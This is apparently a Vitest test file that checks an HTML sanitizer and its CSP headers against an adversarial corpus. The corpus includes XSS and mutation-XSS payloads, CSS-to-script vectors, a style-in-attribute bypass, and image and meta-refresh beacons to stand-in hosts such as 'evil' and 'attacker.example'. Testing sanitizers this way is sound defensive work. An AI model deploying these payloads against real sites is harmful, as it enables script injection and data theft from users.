import { describe, it, expect } from 'vitest'
import {
  sanitizeAtomHtml,
  htmlAtomResponseHeaders,
  HTML_ATOM_CSP,
  SANITIZER_ENGINE,
  SANITIZER_ENGINE_VERSION,
} from './htmlSanitize'

// html-atoms-v1 §2-C — the adversarial corpus for the LOAD-BEARING
// residual sanitizer (the iframe sandbox + header CSP are the
// primary guarantees; this is defense-in-depth for the frame-self-
// nav vector). Assertions encode the ACTUAL security property
// ("would a browser exec / nav / beacon from this output?"), NOT
// lazy substrings — a scrubbed token living as inert CSS text
// inside <style> (with `<` hex-escaped) is harmless.

const clean = (s: string) => sanitizeAtomHtml(s).toLowerCase()

// A live element carrying an inline event handler. Requires a real
// `<tag … onX=` — an `onerror=` sitting in CSS text is NOT matched
// (scrubCss hex-escapes `<`, so no `<tag` precedes it).
const HANDLER_ON_ELEMENT = /<[a-z][a-z0-9]*\b[^>]*?\son[a-z]+\s*=/i
// A script/vb scheme in an attribute VALUE (the dangerous context).
const SCHEME_IN_ATTR =
  /\b(?:href|src|action|xlink:href|data|poster)\s*=\s*["']?\s*(?:java|vb)script:/i

function assertNoExec(o: string) {
  expect(o).not.toContain('<script')
  expect(o).not.toMatch(HANDLER_ON_ELEMENT)
  expect(o).not.toMatch(SCHEME_IN_ATTR)
}

describe('sanitizeAtomHtml — script / handler / protocol exec', () => {
  it('strips <script> (content may remain as inert text)', () => {
    const o = clean('<p>hi</p><script>alert(document.cookie)</script>')
    expect(o).not.toContain('<script')
  })
  it('strips every on* event handler off elements', () => {
    for (const p of [
      '<img src="data:image/png;," onerror="alert(1)">',
      '<svg onload="alert(1)"></svg>',
      '<div onclick="x" onmouseover="y">a</div>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
    ]) {
      expect(clean(p)).not.toMatch(HANDLER_ON_ELEMENT)
    }
  })
  it('strips javascript:/vbscript: in attribute context', () => {
    const o = clean(
      '<a href="javascript:alert(1)">x</a><a href="vbscript:msgbox">y</a>',
    )
    expect(o).not.toMatch(SCHEME_IN_ATTR)
  })
})

describe('P2 dual-review fold — Codex BLOCK regressions (dispositive)', () => {
  // The first cut regex-extracted <style> from RAW HTML; <style>
  // literals inside an ATTRIBUTE VALUE hid handlers/href from
  // DOMPurify and the swap-back resurrected them LIVE. The sound
  // fix parses first (no regex over unparsed input). These exact
  // Codex payloads MUST stay neutralized forever.
  it('FAIL-1: <style> literal in an attribute value cannot hide onclick', () => {
    const o = sanitizeAtomHtml(
      '<div title="<style>" onclick="alert(1)" x="</style>">click</div>',
    )
    expect(o.toLowerCase()).not.toMatch(HANDLER_ON_ELEMENT)
    expect(o.toLowerCase()).not.toContain('onclick')
  })
  it('FAIL-2: the same trick cannot resurrect a forbidden href', () => {
    const o = sanitizeAtomHtml(
      '<a title="<style>" href="https://attacker.example/nav" x="</style>">go</a>',
    )
    expect(o).not.toContain('attacker.example')
    expect(o.toLowerCase()).not.toMatch(/href\s*=\s*["']?https?:/)
  })
  it('FAIL-3: data:image/* is NOT allowed on a navigational <a href>', () => {
    for (const p of [
      '<a href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">go</a>',
      '<a href="data:image/png;base64,iVBORw0KGgo=">go</a>',
      '<area href="data:image/svg+xml,<svg></svg>">',
      '<svg><a xlink:href="data:image/svg+xml,<svg/>"><text>x</text></a></svg>',
    ]) {
      const o = sanitizeAtomHtml(p)
      expect(o).not.toContain('data:image')
    }
    // …but a #fragment nav stays, and data:image as an IMAGE load stays.
    expect(sanitizeAtomHtml('<a href="#sec">x</a>')).toContain('#sec')
    expect(
      sanitizeAtomHtml('<img src="data:image/png;base64,iVBORw0KGgo=">'),
    ).toContain('data:image/png')
  })
  it('C3: data:text/html / non-image data: dropped from <img src>', () => {
    expect(sanitizeAtomHtml('<img src="data:text/html,<b>x</b>">')).not.toContain(
      'data:text/html',
    )
    expect(
      sanitizeAtomHtml('<img src="data:application/json,{}">'),
    ).not.toContain('data:application')
  })
  it('C1/C2: $-replacement reflection class is gone (no swap-back)', () => {
    // No String.prototype.replace placeholder swap-back exists, so
    // `$&`/`$\``/`$'` in CSS are inert literals — they cannot reflect
    // or duplicate surrounding output, and no nonce token can leak.
    const o = sanitizeAtomHtml(
      `<style>a{content:"$\`$'$&$1$$"}</style><div data-z="x">tail</div>`,
    )
    expect(o).not.toContain('dohc-style-') // no placeholder concept now
    expect((o.match(/<style>/g) ?? []).length).toBe(1) // no duplicated <style>
    expect(o).toContain('tail')
    assertNoExec(o.toLowerCase())
  })
})

describe('sanitizeAtomHtml — structural / nav / network tags (§2 ban)', () => {
  it('removes iframe/object/embed/base/form/meta/link/noscript/frame', () => {
    const o = clean(
      '<iframe src="data:text/html,x"></iframe>' +
        '<object data="x"></object><embed src="x">' +
        '<base href="http://evil/"><form action="http://evil"></form>' +
        '<meta http-equiv="refresh" content="0;url=http://evil">' +
        '<link rel="stylesheet" href="http://evil/x.css">' +
        '<noscript><img src=x></noscript><frameset></frameset>',
    )
    for (const t of [
      '<iframe',
      '<object',
      '<embed',
      '<base',
      '<form',
      '<meta',
      '<link',
      '<noscript',
      '<frameset',
    ]) {
      expect(o).not.toContain(t)
    }
  })
  it('§2-C frame-self-nav: meta-refresh + http-equiv gone', () => {
    const o = clean(
      '<meta http-equiv="refresh" content="0;url=http://evil/?leak">',
    )
    expect(o).not.toContain('<meta')
    expect(o).not.toContain('http-equiv')
  })
})

describe('sanitizeAtomHtml — URL allow-list (data:image load + #frag only)', () => {
  it('drops external img src; keeps data: image', () => {
    const ext = clean('<img src="http://evil/?exfil=1">')
    expect(ext).not.toContain('http://evil')
    expect(
      sanitizeAtomHtml('<img src="data:image/png;base64,iVBORw0KGgo=">'),
    ).toContain('data:image/png')
    // data:image/svg+xml WITHOUT a trailing `;` (the `,` form) loads
    // fine as an IMAGE (sandbox-safe) — the buggy `;`-required regex
    // is fixed.
    expect(
      sanitizeAtomHtml('<img src="data:image/svg+xml,<svg></svg>">'),
    ).toContain('data:image/svg+xml')
  })
  it('drops external/same-origin <a href>, keeps #fragment', () => {
    expect(clean('<a href="http://evil/x">e</a>')).not.toContain('http://evil')
    expect(clean('<a href="/api/secret">s</a>')).not.toContain('/api/secret')
    expect(sanitizeAtomHtml('<a href="#section-2">go</a>')).toContain(
      '#section-2',
    )
  })
})

describe('sanitizeAtomHtml — known mutation-XSS payloads neutralized', () => {
  const PAYLOADS = [
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<svg><style>{}*{x:expression(alert(1))}</style>',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style>',
    '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
    '<![CDATA[<img src=x onerror=alert(1)>]]>',
    '<style><img src=x onerror=alert(1)></style>',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    '<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>',
    '<xss style="behavior:url(#default#time2)" onbegin="alert(1)">',
  ]
  for (const p of PAYLOADS) {
    it(`neutralized: ${p.slice(0, 40)}…`, () => {
      assertNoExec(clean(p))
    })
  }
})

describe('sanitizeAtomHtml — §2a rich CSS: <style> kept, CSS scrubbed', () => {
  it('keeps a real <style> + inline style=, preserves benign rich CSS', () => {
    const o = sanitizeAtomHtml(
      '<style>.k{background:linear-gradient(#fff,#000);display:grid}' +
        '@keyframes p{to{opacity:1}}@media(min-width:40rem){.k{gap:1rem}}</style>' +
        '<div style="color:rebeccapurple;font:600 14px/1.4 ui-sans-serif">x</div>',
    )
    expect(o).toContain('<style>')
    expect(o).toContain('linear-gradient')
    expect(o).toContain('@keyframes')
    expect(o).toContain('@media')
    expect(o).toContain('style=')
    expect(o).toContain('rebeccapurple')
  })
  it('keeps data:-inlined @font-face (§2a curated fonts)', () => {
    const o = sanitizeAtomHtml(
      "<style>@font-face{font-family:V;src:url(data:font/woff2;base64,AA) format('woff2')}</style>",
    )
    expect(o).toContain('@font-face')
    expect(o).toContain('data:font/woff2')
  })
  it('scrubs legacy CSS→script vectors inside a parsed <style>', () => {
    const o = sanitizeAtomHtml(
      '<style>.a{width:expression(alert(1))}' +
        '.b{-moz-binding:url(x.xml#e)}' +
        '.c{behavior:url(x.htc)}' +
        '.d{background:url(javascript:alert(1))}' +
        '@import url(http://evil/x.css);</style>',
    )
    expect(o).not.toMatch(/[^-]expression\s*\(/i)
    expect(o).not.toMatch(/[^-]moz-binding/i)
    expect(o).not.toMatch(/[^-]behavior\s*:/i)
    expect(o).not.toMatch(/[^-]javascript:/i)
    expect(o).not.toMatch(/@import\b/i)
    expect(o).toContain('blocked-')
  })
  it('hard-blocks </style> + markup breakout from inside CSS', () => {
    expect(
      sanitizeAtomHtml(
        '<style>.x{}</style><script>alert(1)</script><style>a{}</style>',
      ).toLowerCase(),
    ).not.toContain('<script')
    // CSS-injection breakout: invariant is "no exec", not the literal
    // shape of the (safely neutered) leftover markup.
    const tricky = sanitizeAtomHtml(
      '<style>a{content:"</style><img src=x onerror=alert(1)>"}</style>',
    )
    assertNoExec(tricky.toLowerCase())
    expect(tricky).not.toContain('onerror')
  })
  it('passes a {= …} formula token through verbatim (P4 resolves it)', () => {
    expect(
      sanitizeAtomHtml('<p>July: {= sum(logs.*.billable)}</p>'),
    ).toContain('{= sum(logs.*.billable)}')
  })
  it('never throws; empty/garbage → safe string', () => {
    expect(sanitizeAtomHtml('')).toBe('')
    expect(() => sanitizeAtomHtml('<<<>>></p</p><svg<')).not.toThrow()
    expect(() =>
      sanitizeAtomHtml('<style>' + 'a{}'.repeat(200000)),
    ).not.toThrow()
    // @ts-expect-error — defensive: non-string in
    expect(sanitizeAtomHtml(null)).toBe('')
  })
})

describe('htmlAtomResponseHeaders / HTML_ATOM_CSP — exact §2-C policy', () => {
  it('resource-fetch directives have ZERO `self` (opaque-origin correct)', () => {
    expect(HTML_ATOM_CSP).toContain("default-src 'none'")
    expect(HTML_ATOM_CSP).toContain("style-src 'unsafe-inline'")
    expect(HTML_ATOM_CSP).toContain('img-src data:')
    expect(HTML_ATOM_CSP).toContain('font-src data:')
    expect(HTML_ATOM_CSP).toContain("base-uri 'none'")
    expect(HTML_ATOM_CSP).toContain("form-action 'none'")
    expect(HTML_ATOM_CSP).toContain("frame-ancestors 'self'")
    for (const dir of HTML_ATOM_CSP.split(';').map((d) => d.trim())) {
      if (dir.startsWith('frame-ancestors')) continue // embed-control, not fetch
      expect(dir).not.toContain("'self'")
    }
    expect(HTML_ATOM_CSP).not.toMatch(/https?:/)
  })
  it('LAYERING: a CSS url(http:) is NOT the sanitizer’s job — header', () => {
    const o = sanitizeAtomHtml(
      '<div style="background:url(http://evil/leak)">x</div>',
    )
    expect(HTML_ATOM_CSP).toContain("default-src 'none'")
    expect(HTML_ATOM_CSP).toContain('img-src data:')
    expect(typeof o).toBe('string')
  })
  it('headers: text/html, the CSP, nosniff — and nothing improvised', () => {
    const h = htmlAtomResponseHeaders()
    expect(h['Content-Type']).toBe('text/html; charset=utf-8')
    expect(h['Content-Security-Policy']).toBe(HTML_ATOM_CSP)
    expect(h['X-Content-Type-Options']).toBe('nosniff')
    expect(Object.keys(h).sort()).toEqual([
      'Content-Security-Policy',
      'Content-Type',
      'X-Content-Type-Options',
    ])
  })
  it('r2 hygiene: hooks are not stacked — scrub fires exactly ONCE', () => {
    // If the idempotency guard failed and hooks double-registered,
    // scrubCss would run twice → `blocked-blocked-expression(`.
    const o = sanitizeAtomHtml('<style>.a{x:expression(alert(1))}</style>')
    expect(o).toContain('blocked-expression(')
    expect(o).not.toContain('blocked-blocked-')
    // determinism across repeated calls (no per-call hook state)
    const a = sanitizeAtomHtml('<style>.k{color:red}</style><div>x</div>')
    const b = sanitizeAtomHtml('<style>.k{color:red}</style><div>x</div>')
    expect(a).toBe(b)
  })
  it('pins the effective mXSS engine at RUNTIME (silent bump → fails)', () => {
    expect(SANITIZER_ENGINE_VERSION).toBe('3.4.5')
    expect(SANITIZER_ENGINE).toContain('dompurify@3.4.5')
    expect(SANITIZER_ENGINE).toContain('isomorphic-dompurify@3.14.0')
  })
})
